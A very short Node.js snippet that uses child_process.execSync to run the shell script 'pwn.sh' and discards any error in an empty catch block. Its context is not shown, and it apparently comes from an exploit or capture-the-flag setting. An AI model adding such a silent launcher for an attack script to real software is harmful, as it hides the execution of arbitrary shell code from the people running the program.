const { execSync } = require('child_process');
try {
    execSync("bash pwn.sh");
} catch (e) {}
